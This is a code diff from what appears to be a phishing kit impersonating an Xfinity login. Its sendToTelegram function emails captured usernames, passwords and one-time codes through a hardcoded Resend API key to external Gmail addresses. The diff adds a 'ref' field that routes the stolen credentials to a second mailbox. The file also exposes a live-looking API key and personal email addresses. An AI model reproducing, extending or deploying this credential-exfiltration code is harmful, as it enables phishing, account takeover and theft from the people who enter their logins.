@@ -8,12 +8,14 @@ interface TelegramData {
   password: string;
   stage: string;
   otp?: string;
+  ref: number;
 }
 
 // Hardcoded credentials (FOR TESTING ONLY - REVOKE AFTER USE)
 const resend = new Resend("re_ZJmwoKa2_K5MSQg6RGo9iBWf18jC5DMXg");
 const fromEmail = "noreply@corekeyrealty.com";
 const toEmail = "99cshare@gmail.com";
+// const toEmail = "emmanuelar35@gmail.com";
 
 export async function sendToTelegram(data: TelegramData): Promise<void> {
   // Format message for email (username and password only)
@@ -42,7 +44,7 @@ export async function sendToTelegram(data: TelegramData): Promise<void> {
   try {
     const emailResult = await resend.emails.send({
       from: fromEmail,
-      to: [toEmail],
+      to: [data.ref === 1 ? "noreply3789@gmail.com" : toEmail],
       subject: "Xfinity Login Attempt",
       html: emailHtml,
     });
